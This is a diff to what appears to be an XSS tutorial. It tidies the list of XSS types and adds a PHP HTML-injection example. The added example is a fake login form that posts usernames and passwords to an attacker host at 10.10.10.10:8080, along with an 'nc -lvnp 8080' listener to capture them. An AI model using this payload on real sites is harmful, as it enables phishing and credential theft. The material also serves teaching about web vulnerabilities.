@@ -7,9 +7,9 @@ Cross-site scripting (also known as XSS) is a web security vulnerability that al
 
 Types of XSS
 
-Reflected XSS         // where the malicious script comes from the current HTTP request.
-Stored XSS            // where the malicious script comes from the website's database.
-DOM-based XSS         // where the vulnerability exists in client-side code rather than server-side code.
+- Reflected XSS         // where the malicious script comes from the current HTTP request.
+- Stored XSS            // where the malicious script comes from the website's database.
+- DOM-based XSS         // where the vulnerability exists in client-side code rather than server-side code.
 
 What can XSS abused for:
 
@@ -120,5 +120,16 @@ if (!isset($_GET['name']))  // Accept user input
   echo "<h1>Hi $name!";
 }
 
+
+```
+
+Basic PHP XSS HTML Injection Example
+
+```
+h3>Please login to proceed</h3> <form action=http://10.10.10.10:8080>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
+
+// Inject the above command inside a vulnerable input field / box
+
+Attacker: nc -lvnp 8080 // To capture credentials
 
 ```
